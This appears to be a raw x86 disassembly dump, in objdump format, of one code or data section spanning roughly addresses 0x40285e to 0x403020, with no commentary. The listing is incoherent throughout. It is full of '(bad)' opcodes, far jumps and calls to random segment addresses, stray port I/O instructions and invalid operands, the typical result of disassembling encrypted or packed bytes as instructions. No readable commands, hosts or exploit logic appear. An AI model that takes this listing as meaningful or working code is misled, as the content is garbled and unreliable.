  40285e:	ficomp DWORD PTR [ebp-0x2b855106]
  402864:	sub    dh,BYTE PTR [esi+0x6f]
  402867:	inc    edx
  402868:	ror    ch,0x48
  40286b:	mov    esp,0xc50d2db5
  402870:	(bad)  
  402871:	pop    esi
  402872:	push   eax
  402873:	jecxz  0x402883
  402875:	inc    BYTE PTR ds:0x2e873173
  40287b:	std    
  40287c:	pmulhuw mm1,QWORD PTR [esi+0x1d]
  402880:	or     BYTE PTR [eax-0x2b10bd8c],0x51
  402887:	mov    esi,0xcdca7463
  40288c:	sbb    al,0x33
  40288e:	int3   
  40288f:	fld    QWORD PTR [ebx+ecx*2-0x1f]
  402893:	mov    bl,0x1e
  402895:	ficomp WORD PTR [edx+eiz*8]
  402898:	sbb    edx,edi
  40289a:	inc    esp
  40289b:	and    ah,0xbc
  40289e:	push   eax
  40289f:	sbb    dh,BYTE PTR [edx-0x5f]
  4028a2:	sub    al,0x9a
  4028a4:	xchg   DWORD PTR [eax+0x38],eax
  4028a7:	pop    esp
  4028a8:	ficomp DWORD PTR [edi+0x2b]
  4028ab:	(bad)  
  4028ac:	shl    BYTE PTR [ebx+0x69],cl
  4028af:	lea    ebx,[ecx-0x5]
  4028b2:	mov    edx,gs
  4028b4:	dec    esp
  4028b5:	icebp  
  4028b6:	lds    edx,FWORD PTR [ecx+0x64c9e92b]
  4028bc:	mov    WORD PTR [esi],es
  4028be:	cmp    eax,0xfd00d49c
  4028c3:	and    al,0x5
  4028c5:	push   0x54846442
  4028ca:	call   0x5a9e:0xdb4cebef
  4028d1:	add    cl,al
  4028d3:	stos   DWORD PTR es:[edi],eax
  4028d4:	push   ss
  4028d5:	inc    esp
  4028d6:	sbb    BYTE PTR [edi+0x372033e0],bl
  4028dc:	in     al,dx
  4028dd:	ss pop ebx
  4028df:	add    esi,DWORD PTR [ecx-0x4ad06ddb]
  4028e5:	fs sti 
  4028e7:	out    dx,eax
  4028e8:	dec    esi
  4028e9:	or     ebx,DWORD PTR [edi+0x51d6fd16]
  4028ef:	mov    bl,0x8e
  4028f1:	neg    BYTE PTR [esi+ebp*1]
  4028f4:	mov    bl,0xa9
  4028f6:	push   ds
  4028f7:	pushf  
  4028f8:	push   ebp
  4028f9:	mov    bl,0xd3
  4028fb:	push   edx
  4028fc:	jmp    0xc1bf:0xd0855d7
  402903:	jle    0x40294f
  402905:	mov    al,0x53
  402907:	or     BYTE PTR [esi+0x49],dh
  40290a:	jnp    0x40294b
  40290c:	sbb    BYTE PTR [ebx],bl
  40290e:	sbb    edx,DWORD PTR [esi+0xc87aa7a]
  402914:	push   0x61a631d6
  402919:	fcom   st(0)
  40291b:	xchg   ebp,eax
  40291c:	dec    edx
  40291d:	xchg   BYTE PTR [esi-0x67],ch
  402920:	push   ebp
  402921:	adc    eax,0x9d04790a
  402926:	jbe    0x4029a1
  402928:	scas   al,BYTE PTR es:[edi]
  402929:	dec    eax
  40292a:	stos   DWORD PTR es:[edi],eax
  40292b:	or     al,BYTE PTR [eax-0x2776ad60]
  402931:	mov    ebx,0x24bc695f
  402936:	sbb    al,0x11
  402938:	mov    eax,0x2664cead
  40293d:	add    ah,BYTE PTR [esi-0x7ba1f49a]
  402943:	adc    eax,0xe178584f
  402948:	inc    ebx
  402949:	jecxz  0x4029a5
  40294b:	mov    cl,0x0
  40294d:	push   es
  40294e:	fild   DWORD PTR [ecx+eiz*8+0x29]
  402952:	lock mov esi,ecx
  402955:	cmp    DWORD PTR ds:0xe8189eb,edx
  40295b:	adc    DWORD PTR [edi-0x6a846e16],esi
  402961:	mov    bl,0xfc
  402963:	mov    bh,0xc4
  402965:	or     ecx,ecx
  402967:	xor    edx,DWORD PTR [esi+0xbdd7cd]
  40296d:	std    
  40296e:	push   edx
  40296f:	xor    ecx,DWORD PTR [eax+eax*8-0x3e97940b]
  402976:	ror    BYTE PTR [ebp-0x716ac235],1
  40297c:	push   ecx
  40297d:	push   edi
  40297e:	in     eax,dx
  40297f:	dec    ebx
  402980:	sbb    BYTE PTR [ecx+0x48],ah
  402983:	push   0xffffff8b
  402985:	adc    cl,BYTE PTR [edi+0x2907f046]
  40298b:	add    BYTE PTR [ebx+0x10],cl
  40298e:	mov    ds:0x57deef01,al
  402993:	mov    al,ds:0x394cabb4
  402998:	(bad)  
  402999:	fistp  QWORD PTR [esi]
  40299b:	test   ch,0x1c
  40299e:	jle    0x4029f7
  4029a0:	push   edx
  4029a1:	jmp    0xcdfb:0x2ab96d21
  4029a8:	mov    cl,0xa8
  4029aa:	sbb    BYTE PTR [esi],dl
  4029ac:	sub    dl,BYTE PTR [eax]
  4029ae:	lds    esi,FWORD PTR [ebx]
  4029b0:	mov    dl,0x0
  4029b2:	mov    BYTE PTR [edi],ch
  4029b4:	dec    esi
  4029b5:	jg     0x4029a0
  4029b7:	push   edx
  4029b8:	lahf   
  4029b9:	xor    dl,BYTE PTR [esp+esi*1]
  4029bc:	mov    ebx,0x231abde5
  4029c1:	call   0x23f8:0xace20b6b
  4029c8:	aas    
  4029c9:	inc    esp
  4029ca:	cli    
  4029cb:	subps  xmm1,XMMWORD PTR [ebx+0x7fe9978d]
  4029d2:	adc    dl,BYTE PTR [edi]
  4029d4:	aaa    
  4029d5:	aad    0xe6
  4029d7:	jns    0x402980
  4029d9:	mov    DWORD PTR [ebp-0x28],ecx
  4029dc:	push   esp
  4029dd:	(bad)  
  4029df:	mov    edi,0xe37e8947
  4029e4:	and    al,0x35
  4029e6:	repz stc 
  4029e8:	pop    esi
  4029e9:	add    ebp,DWORD PTR [edi]
  4029eb:	js     0x402980
  4029ed:	sbb    DWORD PTR [ebp-0x61],0xffffffc1
  4029f1:	push   cs
  4029f2:	or     eax,0xf973e06d
  4029f7:	push   ds
  4029f8:	out    dx,eax
  4029f9:	loopne 0x402a0f
  4029fb:	mov    eax,0x9505faf6
  402a00:	je     0x402a3b
  402a02:	(bad)  
  402a03:	push   DWORD PTR [ecx]
  402a05:	mov    cl,0xb7
  402a07:	ins    DWORD PTR es:[edi],dx
  402a08:	stos   BYTE PTR es:[edi],al
  402a09:	push   0x73585476
  402a0e:	repz xor BYTE PTR [edi],dl
  402a11:	cmp    ebx,DWORD PTR [edx+esi*2-0x104ed921]
  402a18:	pop    eax
  402a19:	push   0xddea9613
  402a1e:	cld    
  402a1f:	mov    DWORD PTR [ebx],edx
  402a21:	sub    DWORD PTR [edx+0xd],ebp
  402a24:	dec    edi
  402a25:	and    BYTE PTR [edx-0x22fdeda1],dh
  402a2b:	cmp    al,0xc4
  402a2d:	cs enter 0x4c78,0xff
  402a32:	push   ds
  402a33:	inc    esp
  402a34:	test   DWORD PTR [ecx+0x4df2c789],eax
  402a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a3b:	cmp    bh,bl
  402a3d:	fucomp st(5)
  402a3f:	ror    DWORD PTR [esp+ebp*4],1
  402a42:	push   ecx
  402a43:	mov    DWORD PTR [edx],0xee886674
  402a49:	cld    
  402a4a:	mov    al,0x75
  402a4c:	popa   
  402a4d:	sub    eax,0x2079384d
  402a52:	(bad)  
  402a54:	test   eax,0x88f9a929
  402a59:	jp     0x4029e3
  402a5b:	or     BYTE PTR [ebp-0x973dc87],bh
  402a61:	add    esi,0xffffffcc
  402a64:	sub    DWORD PTR [ebx+edx*2-0x17],ebp
  402a68:	pop    ss
  402a69:	fist   DWORD PTR [ecx+0x2b159810]
  402a6f:	rol    ebp,cl
  402a71:	ret    
  402a72:	shl    DWORD PTR [ebx],1
  402a74:	inc    ebx
  402a75:	inc    ebp
  402a76:	cmp    al,cl
  402a78:	lods   eax,DWORD PTR ds:[esi]
  402a79:	in     al,0x27
  402a7b:	mov    edx,0x4f0dcf08
  402a80:	dec    eax
  402a81:	dec    edi
  402a82:	cmp    al,0x49
  402a84:	aaa    
  402a85:	popa   
  402a86:	stc    
  402a87:	mov    al,ds:0xc956fa14
  402a8c:	loope  0x402aac
  402a8e:	out    dx,al
  402a8f:	mov    ds:0x1210375f,al
  402a94:	dec    esi
  402a95:	repz push cs
  402a97:	and    BYTE PTR [eax+0x7c],0xd7
  402a9b:	add    eax,0x80f68486
  402aa0:	test   DWORD PTR [ebp+ecx*4+0x6d85d8e6],esi
  402aa7:	sbb    cl,BYTE PTR [ebx]
  402aa9:	mov    ebx,0x92d71241
  402aae:	jmp    0x402ac8
  402ab0:	ja     0x402b04
  402ab2:	repz ret 0xd647
  402ab6:	xchg   edi,eax
  402ab7:	test   al,0x8
  402ab9:	out    dx,eax
  402aba:	add    al,0xff
  402abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402abd:	punpckhdq mm7,mm1
  402ac0:	sub    al,0x27
  402ac2:	dec    ebp
  402ac3:	rcr    DWORD PTR [edx+0x437cac75],0x65
  402aca:	or     eax,0xd3cfe0d5
  402acf:	inc    edi
  402ad0:	cmp    DWORD PTR [bp+si-0x3a],eax
  402ad4:	fsub   st,st(3)
  402ad6:	and    dh,bh
  402ad8:	xlat   BYTE PTR ds:[ebx]
  402ad9:	int    0x7f
  402adb:	enter  0x8b7,0x2
  402adf:	jge    0x402a6f
  402ae1:	fimul  WORD PTR [edi]
  402ae3:	cld    
  402ae4:	mov    ds:0xa4524a20,eax
  402ae9:	pop    edi
  402aea:	add    ecx,DWORD PTR [ebp+0x4d]
  402aed:	ret    
  402aee:	add    BYTE PTR [edi-0x4049dbc2],ch
  402af4:	ret    
  402af5:	inc    ebx
  402af6:	out    0x87,eax
  402af8:	retf   0xa5b1
  402afb:	scas   eax,DWORD PTR es:[edi]
  402afc:	sbb    edi,esp
  402afe:	cwde   
  402aff:	sti    
  402b00:	(bad)  
  402b01:	out    dx,eax
  402b02:	test   DWORD PTR [ecx-0x4a061d5a],ebx
  402b08:	pop    es
  402b09:	and    BYTE PTR [eax-0x35],bl
  402b0c:	leave  
  402b0d:	(bad)  
  402b0e:	push   0xffffffb0
  402b10:	mov    bh,0xe6
  402b12:	lock cld 
  402b14:	cmp    dl,BYTE PTR [edi]
  402b16:	shl    DWORD PTR [esi-0x48],cl
  402b19:	mov    fs,WORD PTR [eax]
  402b1b:	xchg   ebp,eax
  402b1c:	xchg   edi,eax
  402b1d:	xchg   dx,ax
  402b1f:	enter  0x3377,0x7a
  402b23:	inc    edx
  402b24:	jecxz  0x402ace
  402b26:	push   ds
  402b27:	mov    DWORD PTR [ebp-0x41558126],0xac8d9b95
  402b31:	xchg   ebp,eax
  402b32:	mov    edx,DWORD PTR [ebp+ebp*8+0x7649df65]
  402b39:	push   esi
  402b3a:	addr16 (bad) 
  402b3c:	outs   dx,BYTE PTR ds:[esi]
  402b3d:	ss xchg esi,eax
  402b3f:	mov    ecx,0xc845cf7e
  402b44:	push   ds
  402b45:	js     0x402aca
  402b47:	mov    cl,0x9d
  402b49:	mov    ch,0xc2
  402b4b:	sbb    BYTE PTR [ebx+ebx*2],dl
  402b4e:	pop    eax
  402b4f:	pop    esp
  402b50:	imul   eax,DWORD PTR [ebx],0x13
  402b53:	nop
  402b54:	call   0x84ac1bae
  402b59:	cli    
  402b5a:	or     al,BYTE PTR [eax+edx*2+0x2d6ef857]
  402b61:	mov    ebp,0xc9b0b9c9
  402b66:	test   al,0x8a
  402b68:	ins    DWORD PTR es:[edi],dx
  402b69:	mov    al,fs:0x2cf741a6
  402b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b70:	fiadd  WORD PTR [ebp+eiz*1-0x37f837d1]
  402b77:	pop    ebx
  402b78:	test   al,0x64
  402b7a:	pop    ebx
  402b7b:	jb     0x402b0e
  402b7d:	jo     0x402b1e
  402b7f:	adc    edx,DWORD PTR [edi]
  402b81:	and    dh,BYTE PTR [eax+0x77]
  402b84:	and    al,dh
  402b86:	cmp    al,0x4a
  402b88:	sbb    eax,0x6dad4de
  402b8d:	mul    esp
  402b8f:	(bad)  
  402b90:	mov    DWORD PTR ds:0xc66622ef,ebx
  402b96:	dec    eax
  402b97:	xchg   esi,eax
  402b98:	sub    edx,DWORD PTR [eax+0x1d]
  402b9b:	cdq    
  402b9c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  402b9e:	jg     0x402b70
  402ba0:	scas   eax,DWORD PTR es:[edi]
  402ba1:	mov    dh,0xfc
  402ba3:	jmp    0x95d4:0x74b2b041
  402baa:	cmp    al,0x38
  402bac:	jns    0x402b56
  402bae:	xor    DWORD PTR [edx-0x44],esi
  402bb1:	(bad)  
  402bb2:	mov    dh,ah
  402bb4:	jns    0x402bb5
  402bb6:	pop    esi
  402bb7:	adc    eax,0x1651b9eb
  402bbc:	sbb    eax,0xf5f98662
  402bc1:	sub    dl,bl
  402bc3:	ins    BYTE PTR es:[edi],dx
  402bc4:	mov    ecx,DWORD PTR [ecx-0x7d8f01f9]
  402bca:	loope  0x402bad
  402bcc:	test   eax,0xfa826ddf
  402bd1:	mov    cl,0xae
  402bd3:	das    
  402bd4:	jmp    FWORD PTR [edx+0x1c2b5e6]
  402bda:	cmp    BYTE PTR [eax-0x79e28580],0x8f
  402be1:	sbb    ah,0x4d
  402be4:	cs jg  0x402b84
  402be7:	popf   
  402be8:	nop
  402be9:	clc    
  402bea:	xchg   edx,eax
  402beb:	mov    eax,ds:0x7ac0f2ab
  402bf0:	aam    0xcb
  402bf2:	test   al,0x42
  402bf4:	cdq    
  402bf5:	mov    esi,DWORD PTR [edi]
  402bf7:	and    DWORD PTR [edx-0x253b2730],esi
  402bfd:	mov    bh,0x10
  402bff:	xchg   ebx,ecx
  402c01:	xchg   edi,eax
  402c02:	pop    ebp
  402c03:	add    ah,BYTE PTR [ebp-0x2aec4c1b]
  402c09:	js     0x402bb5
  402c0b:	jbe    0x402bb1
  402c0d:	push   ecx
  402c0e:	add    dl,al
  402c10:	out    dx,eax
  402c11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c12:	inc    ecx
  402c13:	cwde   
  402c14:	rcr    DWORD PTR [esi],1
  402c16:	sub    eax,0x33bf4a10
  402c1b:	or     bl,BYTE PTR [edi]
  402c1d:	dec    ebx
  402c1e:	and    ah,cl
  402c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c21:	retf   
  402c22:	pop    esp
  402c23:	adc    edi,DWORD PTR [esi]
  402c25:	rol    BYTE PTR [eax-0x4b5c84f6],0x7f
  402c2c:	mov    ebp,0xc7ad889
  402c31:	es test eax,0xe3e1be6f
  402c37:	ficom  DWORD PTR [edi+edx*8+0x6d]
  402c3b:	test   al,0x94
  402c3d:	jo     0x402bdf
  402c3f:	jnp    0x402bd4
  402c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c42:	aas    
  402c43:	sub    ecx,0xfffffffc
  402c46:	test   DWORD PTR [edi],eax
  402c48:	mov    bh,0x23
  402c4a:	push   es
  402c4b:	mov    bl,0xa2
  402c4d:	mov    ebx,0x30962cec
  402c52:	xchg   ebx,eax
  402c53:	call   0x42634e78
  402c58:	cs cmp al,0xbd
  402c5b:	jae    0x402c44
  402c5d:	leave  
  402c5e:	push   edi
  402c5f:	ins    DWORD PTR es:[edi],dx
  402c60:	add    al,0xab
  402c62:	inc    ebp
  402c63:	mov    edi,fs
  402c65:	dec    ebx
  402c66:	pusha  
  402c67:	mov    cl,0xaa
  402c69:	dec    ebp
  402c6a:	loop   0x402bef
  402c6c:	jnp    0x402c92
  402c6e:	sub    ah,BYTE PTR [edi+0x24]
  402c71:	xchg   ebp,eax
  402c72:	popf   
  402c73:	mov    eax,ds:0xc7adfa61
  402c78:	scas   al,BYTE PTR es:[edi]
  402c79:	add    cl,cl
  402c7b:	mov    bl,bl
  402c7d:	sbb    BYTE PTR [edi-0x59],0xbe
  402c81:	mov    dl,0x88
  402c83:	push   es
  402c84:	jmp    0x402c21
  402c86:	pop    esi
  402c87:	daa    
  402c88:	leave  
  402c89:	and    eax,0x6426cc1f
  402c8e:	lods   eax,DWORD PTR ds:[esi]
  402c8f:	lods   eax,DWORD PTR ds:[esi]
  402c90:	jg     0x402cd0
  402c92:	push   cs
  402c93:	lahf   
  402c94:	mov    gs,WORD PTR [eax]
  402c96:	mov    eax,0x118ff6a
  402c9b:	rcr    BYTE PTR [edi],0x79
  402c9e:	loope  0x402cdb
  402ca0:	push   0x39
  402ca2:	jge    0x402c6e
  402ca4:	inc    ebx
  402ca5:	jmp    0x1a7a:0xd76d0a86
  402cac:	inc    ebp
  402cad:	xor    ah,BYTE PTR [ecx-0x61]
  402cb0:	sahf   
  402cb1:	pop    ss
  402cb2:	pusha  
  402cb3:	pop    ebx
  402cb4:	jmp    0x5f5f:0xad28cc33
  402cbb:	pop    ebp
  402cbc:	xor    ch,BYTE PTR [ecx-0x6b]
  402cbf:	dec    ebx
  402cc0:	push   es
  402cc1:	xor    al,0x85
  402cc3:	jo     0x402c9e
  402cc5:	xor    esp,edx
  402cc7:	mov    ah,0xb1
  402cc9:	test   BYTE PTR [ebx+0x79],dl
  402ccc:	fild   WORD PTR [eax]
  402cce:	loop   0x402d32
  402cd0:	mov    ah,BYTE PTR [ebp-0x14]
  402cd3:	cmp    DWORD PTR [edx],0x51cc1bdf
  402cd9:	call   0x35e2:0x16cea82a
  402ce0:	xchg   ecx,eax
  402ce1:	mov    ebp,0xe2bd413b
  402ce6:	push   esi
  402ce7:	add    al,0x61
  402ce9:	xor    eax,0x8b5e1a72
  402cee:	lods   eax,DWORD PTR ds:[esi]
  402cef:	adc    edx,DWORD PTR [edi]
  402cf1:	xor    dl,BYTE PTR [eax+eiz*8]
  402cf4:	dec    edx
  402cf5:	(bad)  
  402cf6:	xchg   esp,eax
  402cf7:	dec    ebp
  402cf8:	mov    cl,0xd7
  402cfa:	xor    DWORD PTR [ecx+0x68ff402f],0xffffff9c
  402d01:	mov    BYTE PTR [esi-0x3e],dl
  402d04:	mov    ebx,0xf2f56de
  402d09:	xchg   edi,eax
  402d0a:	add    edx,0x425bf928
  402d10:	mov    edi,0x59571051
  402d15:	add    BYTE PTR [ecx-0x42],al
  402d18:	ret    
  402d19:	inc    ebp
  402d1a:	push   ebx
  402d1b:	(bad)  
  402d1c:	adc    DWORD PTR [esi-0x343ee81f],ebp
  402d22:	in     al,0x8b
  402d24:	data16 jbe 0x402cbc
  402d27:	xor    BYTE PTR [ebx-0xddf3405],0x18
  402d2e:	dec    esi
  402d2f:	daa    
  402d30:	push   eax
  402d31:	dec    edi
  402d32:	adc    cx,sp
  402d35:	xchg   edx,ebp
  402d37:	lahf   
  402d38:	mul    BYTE PTR [esi+0x66]
  402d3b:	mov    bl,0x42
  402d3d:	fs pop esi
  402d3f:	push   es
  402d40:	add    DWORD PTR [ecx+0x6c40579],esp
  402d46:	aaa    
  402d47:	and    al,BYTE PTR [esi+0x6f]
  402d4a:	hlt    
  402d4b:	or     bh,BYTE PTR [edi]
  402d4d:	dec    edi
  402d4e:	ins    BYTE PTR es:[edi],dx
  402d4f:	out    dx,al
  402d50:	push   ecx
  402d51:	inc    DWORD PTR [edx]
  402d53:	lods   al,BYTE PTR ds:[esi]
  402d54:	cmp    al,0xe3
  402d56:	enter  0x7663,0xc4
  402d5a:	scas   eax,DWORD PTR es:[edi]
  402d5b:	fisttp DWORD PTR [ecx+eax*8+0x4c]
  402d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d60:	sbb    DWORD PTR [eax+0x1e],esp
  402d63:	test   DWORD PTR [ebp+0x37],esp
  402d66:	mov    edi,0xb5b36793
  402d6b:	loop   0x402deb
  402d6d:	int3   
  402d6e:	leave  
  402d6f:	add    esi,DWORD PTR [ebp+esi*2+0x3]
  402d73:	pop    ds
  402d74:	push   esp
  402d75:	das    
  402d76:	ja     0x402d5d
  402d78:	sub    DWORD PTR [ebp-0xa47efb9],esp
  402d7e:	call   0xb975:0x8fd7f2e3
  402d85:	jl     0x402d35
  402d87:	push   0xffffff8a
  402d89:	cmc    
  402d8a:	xlat   BYTE PTR ds:[ebx]
  402d8b:	xor    ch,bh
  402d8d:	adc    DWORD PTR [eax+0x1bf25517],ebp
  402d93:	ret    
  402d94:	call   0x61f1638b
  402d99:	sti    
  402d9a:	jae    0x402d9e
  402d9c:	cmp    DWORD PTR [ebp+0x47f2204],esi
  402da2:	sahf   
  402da3:	in     eax,0x31
  402da5:	sbb    eax,0x8e1f3a39
  402daa:	or     eax,0x53
  402dad:	push   0x7e5ba7d
  402db2:	xor    esp,DWORD PTR [edi-0x4e3987eb]
  402db8:	mov    ecx,0x4d4e7756
  402dbd:	ins    DWORD PTR es:[edi],dx
  402dbe:	add    ebp,DWORD PTR [edx]
  402dc0:	jg     0x402dfd
  402dc2:	lock mov es,ecx
  402dc5:	loopne 0x402dcc
  402dc7:	or     ah,BYTE PTR [edx-0x59b10e77]
  402dcd:	jl     0x402d8b
  402dcf:	lods   al,BYTE PTR ds:[esi]
  402dd0:	xlat   BYTE PTR ds:[ebx]
  402dd1:	lds    edi,FWORD PTR [ebx+eax*8+0x45101d90]
  402dd8:	mov    dh,0x25
  402dda:	test   esp,ecx
  402ddc:	ja     0x402de8
  402dde:	mov    dh,0xd4
  402de0:	nop
  402de1:	aaa    
  402de2:	push   ebp
  402de3:	aam    0x1f
  402de5:	inc    ebp
  402de6:	cmp    DWORD PTR [eax+0x20a414fd],eax
  402dec:	sub    bh,al
  402dee:	xchg   ecx,eax
  402def:	jp     0x402e0a
  402df1:	push   edi
  402df3:	jno    0x402e2a
  402df5:	sti    
  402df6:	fcomp  st(0)
  402df8:	adc    al,0xf7
  402dfa:	mov    ebp,0x6a17124d
  402dff:	stos   DWORD PTR es:[edi],eax
  402e00:	lods   al,BYTE PTR ds:[esi]
  402e01:	dec    ecx
  402e02:	pop    ebp
  402e03:	jp     0x402dc0
  402e05:	jno    0x402ddd
  402e07:	jnp    0x402e20
  402e09:	rol    DWORD PTR [edi],1
  402e0b:	daa    
  402e0c:	push   eax
  402e0d:	sbb    dl,dl
  402e0f:	lock or dh,BYTE PTR [eax+0x33685746]
  402e16:	and    bh,dh
  402e18:	pslld  mm1,QWORD PTR [eax*4-0x6c498c76]
  402e20:	mov    edi,0x6fd1728c
  402e25:	aam    0x18
  402e27:	pop    edi
  402e28:	repz jg 0x402e9b
  402e2b:	mov    eax,ds:0x6504fd4f
  402e30:	xchg   ebx,eax
  402e31:	pop    edx
  402e32:	in     al,0xce
  402e34:	sub    eax,0xbb24d83c
  402e39:	dec    esp
  402e3a:	xchg   esp,eax
  402e3b:	rcr    DWORD PTR [edx],0x64
  402e3e:	(bad)  
  402e3f:	out    dx,al
  402e40:	fimul  DWORD PTR [ecx+0x407194ef]
  402e46:	das    
  402e47:	adc    eax,0x1a958f19
  402e4c:	pop    ebx
  402e4d:	and    eax,0x47ec8571
  402e52:	std    
  402e53:	sbb    al,0xe3
  402e55:	sbb    ecx,edx
  402e57:	add    al,0x6d
  402e59:	xor    bp,sp
  402e5c:	ret    0x6a53
  402e5f:	daa    
  402e60:	jo     0x402edf
  402e62:	test   eax,0xfea27979
  402e67:	in     eax,0x4a
  402e69:	popa   
  402e6a:	out    dx,al
  402e6b:	in     al,dx
  402e6c:	test   al,0xdb
  402e6e:	or     BYTE PTR [ebx+0x2d6ac64],dl
  402e74:	adc    al,dl
  402e76:	xchg   esi,eax
  402e77:	shl    BYTE PTR [ebp+0x69],0x50
  402e7b:	aam    0x5
  402e7d:	lea    ebp,[edi+0x5b3c6409]
  402e83:	(bad)  
  402e84:	mov    BYTE PTR [ebx-0x7b59da8b],cl
  402e8a:	inc    edx
  402e8b:	cmp    esi,DWORD PTR [esi-0x18]
  402e8e:	mov    edx,0x529bd1d7
  402e93:	and    ebp,ebx
  402e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e96:	imul   edi,ecx,0xffffffd6
  402e99:	scas   eax,DWORD PTR es:[edi]
  402e9a:	addr16 (bad) 
  402e9c:	in     al,dx
  402e9d:	adc    bl,BYTE PTR [ebx-0x528da81c]
  402ea3:	fcomp  DWORD PTR [ebx+esi*1-0x4501d7d9]
  402eaa:	adc    eax,0x5d7c5365
  402eaf:	mov    ch,0x17
  402eb1:	hlt    
  402eb2:	dec    edx
  402eb3:	push   esp
  402eb4:	clc    
  402eb5:	dec    ebp
  402eb6:	dec    eax
  402eb7:	call   0x846a:0x6b5c6bba
  402ebe:	std    
  402ebf:	in     al,0xdf
  402ec1:	cdq    
  402ec2:	push   ecx
  402ec3:	popf   
  402ec4:	ror    edx,0xc3
  402ec7:	fst    DWORD PTR [edi-0x302df13e]
  402ecd:	jb     0x402f1d
  402ecf:	sbb    eax,0xf102ba41
  402ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed5:	xor    DWORD PTR [ecx-0x46d391b2],ecx
  402edb:	dec    ecx
  402edc:	add    al,0xce
  402ede:	ins    DWORD PTR es:[edi],dx
  402edf:	xchg   ebp,eax
  402ee0:	mov    ebp,0x235e73db
  402ee5:	aam    0x4a
  402ee7:	lock fbld TBYTE PTR [edx-0x767cdc43]
  402eee:	fild   DWORD PTR [ebx-0x3e]
  402ef1:	test   bl,ch
  402ef3:	pusha  
  402ef4:	mov    ?,WORD PTR [ebx]
  402ef6:	enter  0x6c0c,0x7d
  402efa:	fmul   QWORD PTR [eax+0x66]
  402efd:	adc    cl,BYTE PTR [edx-0x16]
  402f00:	cwde   
  402f01:	out    dx,al
  402f02:	mov    al,0x40
  402f04:	clc    
  402f05:	mov    ds:0x37c3be2d,al
  402f0a:	push   ds
  402f0b:	in     al,dx
  402f0c:	lea    ecx,[ecx+0x4fb8556f]
  402f12:	push   0x1b
  402f14:	mov    al,ds:0x54496bd7
  402f19:	push   ebx
  402f1a:	sub    ecx,eax
  402f1c:	sti    
  402f1d:	test   esp,esi
  402f1f:	aas    
  402f20:	fsub   DWORD PTR [esi+0x28b2e8e8]
  402f26:	sub    al,0xcf
  402f28:	adc    al,0x56
  402f2a:	inc    esi
  402f2b:	sub    cl,ah
  402f2d:	out    0xf0,eax
  402f2f:	loope  0x402fa0
  402f31:	or     DWORD PTR [ebx],esp
  402f33:	lahf   
  402f34:	cmp    ecx,ebx
  402f36:	(bad)  
  402f39:	ins    DWORD PTR es:[edi],dx
  402f3a:	dec    ecx
  402f3b:	test   al,0xe7
  402f3d:	xor    cl,BYTE PTR [esi-0x7571fb0b]
  402f43:	aaa    
  402f44:	outs   dx,BYTE PTR gs:[esi]
  402f46:	xchg   ebx,eax
  402f47:	stos   DWORD PTR es:[edi],eax
  402f48:	xchg   ax,ax
  402f4a:	mov    bl,0x2b
  402f4c:	inc    esi
  402f4d:	mov    edx,?
  402f4f:	jg     0x402edd
  402f51:	push   edx
  402f52:	repnz ins BYTE PTR es:[edi],dx
  402f54:	es jge 0x402ee0
  402f57:	test   DWORD PTR [ebp-0x2d],esp
  402f5a:	jg     0x402f08
  402f5c:	sub    dh,dh
  402f5e:	mov    ebx,0xd09f0bf1
  402f63:	sti    
  402f64:	mov    DWORD PTR [ebp+0xb],ebx
  402f67:	push   ecx
  402f68:	jge    0x402f09
  402f6a:	jmp    0x9156:0x50ef37a4
  402f71:	adc    ebx,DWORD PTR ds:0x5e320138
  402f77:	hlt    
  402f78:	add    BYTE PTR [eax+0x14],dl
  402f7b:	inc    edx
  402f7c:	jecxz  0x402f00
  402f7e:	jo     0x402fa3
  402f80:	mov    ds:0x86563a88,eax
  402f85:	push   ss
  402f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f87:	mov    cl,BYTE PTR [esi+edi*8]
  402f8a:	loop   0x402fd7
  402f8c:	mov    eax,ds:0x4315404b
  402f91:	into   
  402f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f93:	rol    BYTE PTR [esi],cl
  402f95:	iret   
  402f96:	jl     0x402f6e
  402f98:	mov    ch,0x6a
  402f9a:	mov    cs,WORD PTR [edi-0x7c079ae8]
  402fa0:	pop    ebp
  402fa1:	and    al,0x70
  402fa3:	rcr    BYTE PTR [edi-0x166792c8],cl
  402fa9:	cmp    al,0xd6
  402fab:	jl     0x402f2e
  402fad:	add    BYTE PTR ds:0xf82d3e8b,al
  402fb3:	xor    al,0xa8
  402fb5:	out    dx,eax
  402fb6:	dec    edi
  402fb7:	mov    al,ds:0x221d9ab6
  402fbc:	cmp    al,BYTE PTR [esi]
  402fbe:	pop    ds
  402fbf:	(bad)  
  402fc0:	out    dx,eax
  402fc1:	mov    eax,ds:0xf3b6be2c
  402fc6:	out    dx,al
  402fc7:	lock adc eax,0x3e4f7587
  402fcd:	cwde   
  402fce:	fld    TBYTE PTR [ebp-0x308892e8]
  402fd4:	jnp    0x402f93
  402fd6:	jbe    0x40302a
  402fd8:	mov    ah,al
  402fda:	xchg   esp,eax
  402fdb:	mov    ch,0xf7
  402fdd:	xor    cl,0xc4
  402fe0:	mov    dl,0xf8
  402fe2:	add    cl,BYTE PTR [ebx+0x53]
  402fe5:	jne    0x402f9d
  402fe7:	xchg   esi,eax
  402fe8:	jmp    0x5c3d:0xb21541bc
  402fef:	shr    esi,0x53
  402ff2:	out    dx,eax
  402ff3:	repnz or dl,BYTE PTR [esi]
  402ff6:	(bad)  
  402ff7:	iret   
  402ff8:	mov    ecx,0x6bcccd12
  402ffd:	pop    ds
  402ffe:	pusha  
  402fff:	fld    DWORD PTR ds:0xab948093
  403005:	jae    0x403044
  403007:	jnp    0x403024
  403009:	mov    edx,0xbd15f147
  40300e:	(bad)  
  40300f:	retf   
  403010:	mov    eax,ds:0x7d8b405e
  403015:	cmp    al,ch
  403017:	sbb    al,0xa0
  403019:	xchg   ecx,eax
  40301a:	push   esp
  40301b:	out    0x48,eax
  40301d:	jecxz  0x402fdd
  40301f:	push   ecx
  403020:	nop
